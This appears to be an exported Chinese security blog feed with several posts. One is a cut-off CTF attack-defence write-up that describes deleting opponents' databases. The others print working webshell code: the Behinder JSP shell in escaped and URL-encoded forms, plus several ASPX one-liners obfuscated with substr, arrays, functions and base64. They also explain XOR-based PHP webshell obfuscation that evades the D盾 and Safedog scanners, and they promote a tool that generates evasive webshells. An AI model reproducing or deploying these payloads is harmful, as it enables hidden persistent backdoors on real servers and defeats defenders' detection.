就被赋值为png然后if语句就结束了也就是说他这个判断后缀是没什么卵用的，任意的后缀就可以跳过他这个判断继续往下执行。但是当时无法利用，因为网站权限被设置为不可写。。。也就是说你只有ssh才可以更改网站的内容。马失前蹄因为漏洞都比较简单，很快就看完了。简单说了一下分工，就让牛逼牛逼最牛逼巨佬naivekun师傅修洞，我们就开始写批量getflag脚本然后批量交flag结果突然听见naivekun师傅大叫一声卧槽看积分榜我们居然只有100分其他队都是1000起步喵喵喵？？？我眼花了吗？？？后来问kun师傅怎么修的，他说直接把参数删了。。。完 蛋，国 赛 重 现其实研究一下规则就知道，别人打你就扣5分但是你修炸了就一下扣100。。。唉，国赛就是这样被坑惨的，做题不少。。。但是越修分数越低。。。但是也不会掉这么多啊，一下成了倒数第一后来看群里才知道，由于技术师傅的手误，前两轮设置后台check扣分的时候多按了一个0，导致一次check扣了我们1000分。。。然后我们手速比较快修的比较急，刚好在扣分的第一轮没修好就被扣分了赶紧把洞重新修了一遍gg，跟别的队差1000分还打个毛啊猛男落泪.jpg搅屎翻盘之旅不过这个比赛有一点好处就是时间长，5分钟一轮，四个小时。算了算我们还是有翻盘的机会的毕竟手速快，顺便稳定了权限，基本上当时所有队伍的权限都在我们手里。分工了一下一个人稳定权限拿flag，一个人写批量脚本交flag，一个人搅屎。pwn跟web是分开的，也差不多这个样子当时自己批量getflag的截图这是一个洞的脚本，多的图就没截了然后慢慢分数就涨了上去，倒数第二还是第三吧删库跑路只靠得分不行，因为分差太小了，一轮全部拿到其他队伍的flag还没有扣得多所以就想着搅屎因为别人扣分实际上就相当于自己队伍得分搅屎本来想删站的，结果没权限，就少了很多乐趣。然后想着能不能fork炸弹啊磁盘写满啊这种后来naivekun师傅发现可以删库让整个站500哈哈哈哈快乐删库跑路图：被群里人发现了基本上把大多数队伍的库都删了个遍但是我们后来发现删库居然不扣分？？？在群里问技术原来check扣分异常。。。所以技术直接把check关了。。。好的吧，反正继续搅屎没毛病然后写个循环脚本，继续删库。。pwn也开始搅屎了附上队员blackbinary的犯罪证据直接echo fuckyou到二进制文件里这样其他队伍就无法攻击得到flag逐渐回暖后来因为搅屎比赛太过激烈我们的队伍分数在逐渐往上涨，其他大多数被删库就在往下掉最后就也不想打了，全部是自动化getflag，自动化提交了，大家也都自己干自己的事去了。附上几张当时的截图随机队名，我们是Colombia队第三了然后第二了最后结果，第二名后续在多扣1000分的情况下从倒数第一反杀到第二最后说给我们分数加上但是也没加，毕竟训练赛就当打着玩还是挺好玩的，但是中途平台bug比较多什么flag提交不上，提交频率过快然而最让我懵逼的是他平台有漏洞每个队伍的cookie居然只是队伍名的md5。。。阿伟死了最后总结一下反杀的原因还是主要靠搅屎，让其他队伍扣分不然快1000分的分差靠只有5分一个的flag很难追上不管怎么说这个线上awd还是挺有趣的操作虽然都是常规操作，但也是对团队分工合作，搅屎技术的一次综合考验特地写下这篇文章记录一下。小插曲喵喵喵？？？]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>AWD</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于我的星球]]></title>
    <url>%2Fposts%2Fwebshell-venom-notice%2F</url>
    <content type="text"><![CDATA[window.location.href="../../zsxq/"]]></content>
      <categories>
        <category>随便写写</category>
      </categories>
      <tags>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[如何优雅的把cmdshell升级为一句话]]></title>
    <url>%2Fposts%2Fcmd2bx%2F</url>
    <content type="text"><![CDATA[12019-7-11 自己发在土司的文章前言前一段时间致远OA的洞坑了不少公司自己也复现了一下 但是有个很恶心的问题就是 默认的payload是有长度限制的并且只是一个cmd的shellLinux的shell还比较灵活 但是win的来说就不太方便了特别是配合上恶心的url编码在浏览器里面遇到反斜杠就gg那么怎么把cmdshell优雅的转化为可以连接的一句话呢看了以前的帖子大概有这几个办法12345Js+cscriptCertutil +base64Win7以上还有bitsadmin Ps 等等等等Bitsadmin就不说了Certutil跟cscript远程下载其实也不错但是有两个问题1 如果主机不通外网就gg2 360会拦截综合来说都有自己的不足之处还是一句话echo最稳了自己也研究了一下 但是用echo写马有两个天坑1.win的尖括号转义Win的尖括号要用^来转义而不是反斜杠如果你要是放到引号里会把引号一起打印出来2. 沙雕url编码https://www.cnblogs.com/i80386/p/4576699.html大家可以自己去网上找一下帖子到底url编码有多混乱。。。。这里就说说python的requests模块的url编码经过测试123空格=&gt;%20%空格=&gt;%%20%20=&gt;%20也就是说 他在默认遇到百分号开头的字符串的时候 request模块会把它当做已经编码过的字符 直接发送过去但是他就带来个问题不会自动编码百分号所以你只把尖括号跟百分号转义过后的payload放到py脚本里还是不能正常执行这里偷了个懒直接找的在线网站，把它编码一遍再放到python里http://tool.chinaz.com/tools/urlencode.aspx综上：原来payload（冰蝎为例）1&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%&gt;&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%&gt;&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%&gt;尖括号转义=&gt;1^&lt;%@page import=&quot;java.util.*,javax.crypto.*,javax.crypto.spec.*&quot;%^&gt;^&lt;%!class U extends ClassLoader&#123;U(ClassLoader c)&#123;super(c);&#125;public Class g(byte []b)&#123;return super.defineClass(b,0,b.length);&#125;&#125;%^&gt;^&lt;%if(request.getParameter(&quot;pass&quot;)!=null)&#123;String k=(&quot;&quot;+UUID.randomUUID()).replace(&quot;-&quot;,&quot;&quot;).substring(16);session.putValue(&quot;u&quot;,k);out.print(k);return;&#125;Cipher c=Cipher.getInstance(&quot;AES&quot;);c.init(2,new SecretKeySpec((session.getValue(&quot;u&quot;)+&quot;&quot;).getBytes(),&quot;AES&quot;));new U(this.getClass().getClassLoader()).g(c.doFinal(new sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext);%^&gt;url编码=&gt;1%5e%3c%25%40page+import%3d%22java.util.*%2cjavax.crypto.*%2cjavax.crypto.spec.*%22%25%5e%3e%5e%3c%25!class+U+extends+ClassLoader%7bU(ClassLoader+c)%7bsuper(c)%3b%7dpublic+Class+g(byte+%5b%5db)%7breturn+super.defineClass(b%2c0%2cb.length)%3b%7d%7d%25%5e%3e%5e%3c%25if(request.getParameter(%22pass%22)!%3dnull)%7bString+k%3d(%22%22%2bUUID.randomUUID()).replace(%22-%22%2c%22%22).substring(16)%3bsession.putValue(%22u%22%2ck)%3bout.print(k)%3breturn%3b%7dCipher+c%3dCipher.getInstance(%22AES%22)%3bc.init(2%2cnew+SecretKeySpec((session.getValue(%22u%22)%2b%22%22).getBytes()%2c%22AES%22))%3bnew+U(this.getClass().getClassLoader()).g(c.doFinal(new+sun.misc.BASE64Decoder().decodeBuffer(request.getReader().readLine()))).newInstance().equals(pageContext)%3b%25%5e%3e然后写个轮子就可以批量cmd转一句话啦写了个脚本支持批量检测跟单个检测如果是1http://开头的就识别成单个xxx.txt就是批量需要设置一下脚本里面的cmdshell地址跟密码项目地址：https://github.com/yzddmr6/cmd2bxTCV: 0]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[一键吊打D盾(免杀一句话无限生成)]]></title>
    <url>%2Fposts%2Fwebshell-venom%2F</url>
    <content type="text"><![CDATA[12019-7-15 自己发在土司的文章前言最近逛帖子发现好多人还在找各种免杀一句话。。。都9102年了 都不知道有webshell-venom这个东西吗。。。看来我的宣传还是不到位。。。再给大家介绍一下吧项目地址：https://github.com/yzddmr6/webshell-venom蚁剑插件版：https://github.com/yzddmr6/as_webshell_venom自己几个月前做的项目，一直到现在照样吊打各路防火墙(静态扫描)各类型免杀截图使用方法说明文档因为写的太多了全部放在doc下面包含了免杀脚本编写的思路以及一些小技巧需要的自取https://github.com/yzddmr6/webshell-venom/tree/master/doc后言我看到有很多waf的厂商已经关注了我的github本来开始项目名字叫php_xor_bypass只是php免杀脚本后来增加了asp aspx类型webshell-venom 1.0 的时候不到一周就被D盾查杀了现在是200个星，等到300个星放出下一个版本禁止用于非法用途！]]></content>
      <categories>
        <category>安全工具</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[无限免杀D盾脚本之aspx]]></title>
    <url>%2Fposts%2Fwebshell-venom-aspx%2F</url>
    <content type="text"><![CDATA[12019-7-15 自己发在土司的文章前言自己曾经写过一篇文章:利用随机异或无限免杀某盾php的webshell免杀方法有很多,但是市面上很少有讲aspx免杀的文章.因为aspx的权限一般较大,对于渗透过程中还是很重要的, 所以就想着写一篇文章来简单的介绍下aspx的免杀0x01 主要方法1234字符串拼接函数数组Base64编码0x02 了解aspx一句话Aspx的一句话一般是使用Jscript语言实现看看原本的菜刀aspx一句话1&lt;%@ Page Language=&quot;Jscript&quot;%&gt; &lt;%eval(Request.Item[&quot;pass&quot;],&quot;unsafe&quot;);%&gt;其实与php的类似Eval函数将字符串当做代码执行不同的是在Jscript中为了安全起见必须使用unsafe参数,才可以使其具有对操作系统操作的功能Request.Item[“pass”] 的pass就是接受的参数 类似于php的$_POST[“pass”]Jscript基本用法1Function xxx()&#123;&#125;//声明一个函数字符串拼接12Var a =’a’+’b’;//a=’ab’;Var a= ‘\x61’; //a=’a’;数组声明12Var a=’abc’;Var b=a(0);//b=’a’;作为免杀来说一般waf杀的都是unsafe这个参数,所以我们的免杀也将从这个参数下手0x02 字符串拼接经过测试,一般来说把’unsafe’这个字符串无论是十六进制拼接还是直接大小写拼接均不可行于是想到可以采用substr函数12345678&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=Request.Form(&quot;mr6&quot;);var b=&apos;aaaunsaaaafe&apos;;var b=b.substr(3,4)+b.substr(10);eval(a,b);%&gt;0x03 数组感觉大多数waf对数组拼接并不感冒,就可以打乱顺序,利用数组进行拼接1234567&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=&apos;efasnu&apos;;var b=Request.Form(&quot;mr6&quot;);var c=a(5)+a(4)+a(3)+a(2)+a(1)+a(0);eval(b,c);%&gt;0x04 函数因为某盾对字符串拼接杀得比较厉害,放在函数里当做返回值即可123456789101112&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=Request.Form(&quot;mr6&quot;);function ok()&#123;var c=&quot;un&quot;;var b=&quot;safe&quot;;return c+b;&#125;eval(a,ok());%&gt;0x05 BASE64编码Php中经常使用base64编码来bypass,那么在aspx中如何实现呢1var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(‘eXpkZG1yNg==’);//res=’yzddmr6’;那么我们对于unsafe这个特征就可以使用base64编码来绕过1234567&lt;%@ Page Language=&quot;Jscript&quot; Debug=true%&gt;&lt;%var a=Request.Form(&quot;mr6&quot;);var res=System.Text.Encoding.GetEncoding(65001).GetString(System.Convert.FromBase64String(&apos;dW5zYWZl&apos;));eval(a,res);%&gt;0x06 总结可能是因为aspx的免杀现在还不是很多,所以waf的查杀并不是很严格,不需要太复杂就可以绕过.对于以上方法还可以连环套用,以达到混淆的效果自己写了个脚本,利用以上方法来无限生成免杀aspx的webshell已经放到了自己的项目webshell_venom中项目地址:https://github.com/yzddmr6/webshell-venom]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用随机异或无限免杀d盾]]></title>
    <url>%2Fposts%2Fwebshell-venom-1-0%2F</url>
    <content type="text"><![CDATA[1自己三个月前在圈子发的文章，保存一下前言最近D盾更新了,在某司某圈也看到了不少免杀d盾免杀狗的一句话帖子但是基本上只要放出来不到两天时间就加入查杀全家桶.最近一直在造各种车轮子就想着其实可以写个脚本利用异或来fuzz出指定的字符然后拼接出assert或者create_function等函数,来对抗waf的检测.思路及实现首先如何fuzz的问题先讲一个离散数学中的概念叫可逆 ,异或的运算就是具有可逆性的.具体什么意思呢,就是说若ab=c，则有bc=a所以只要把需要拼凑出来的字符串a跟随机取出来的符号b异或,然后出来的结果c就是需要跟b异或的内容.举个例子我们来echo一下字符a跟符号*异或的结果是大写字母K然后把大写K跟*异或就出来了我们想要的a那么也就是1a=K^*但是在写的过程中问题来了很多时候异或出来的字符是不可见的小方块就需要把它编码看了以前有一篇文章是用url编码但是在实现过程中发现url编码也有一定概率出现不可表示的字符那就开开心心上hex吧最终成功拼接出来了assert接下来就是写个字符串池子,用来存特殊符号,然后随机取出来进行异或,拼接想要的字符.把它封装成函数可以设置需要异或的字符串长度其实也可以用中文甚至emoji表情来异或,但是考虑到乱码还有不同系统对表情的支持不同,就算了.取出拼接好的assert,把get的数据传进去,就成了下面这样哈,看来可以使用啦接着是调用的问题,其实到了这个地步不管你什么d盾安全狗已经认不出来函数里面写的什么意思了但是他会根据函数的调用来检测拦截如果这个时候直接调用的话会爆一级可疑函数.既然做免杀肯定要0级了啦放到类里面再调用就好了接下来就是造轮子了在脚本中为了增大waf识别的难度 类名方法名也随机化了.使用方法右键查看生成的源码已经保存到同目录下1.php里面了生成了十几个附上过D截图最后脚本特点有三个一利用特殊符号异或达到迷惑waf的目的,并且因为每一次的拼接都是随机生成的,所以单单一个文件进了特征库也不用担心二是利用类调用,类名函数名随机化,杀软分析起来可能跟普通的文件没有什么区别三是没有assert eval create_function 等这些关键字,更为隐蔽.因为是随手写的,所以代码比较糙,不过不要在意这些细节……只是提供了一个思路,其实大马也可以像这样写个免杀模版,下一篇文章再讲吧虽然都是随机化,也没有assert eval 这种关键字,但是用的人多了当然脚本的免杀性也失效了,可以关注我的github:https://github.com/yzddmr6以后更新的免杀脚本都会放在上面.如果有什么讲的不对的地方还请大佬们多多包涵.源码地址https://github.com/yzddmr6/webshell-venom]]></content>
      <categories>
        <category>技术文章</category>
      </categories>
      <tags>
        <tag>免杀</tag>
        <tag>webshell-venom</tag>
      </tags>
  </entry>
</search>
